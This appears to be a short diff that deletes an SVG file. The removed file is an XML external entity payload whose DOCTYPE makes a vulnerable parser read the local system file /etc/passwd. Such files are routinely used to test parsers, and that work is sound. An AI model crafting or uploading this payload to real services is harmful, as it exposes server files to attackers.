@@ -1,2 +1,0 @@
-<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg">&x;</svg>
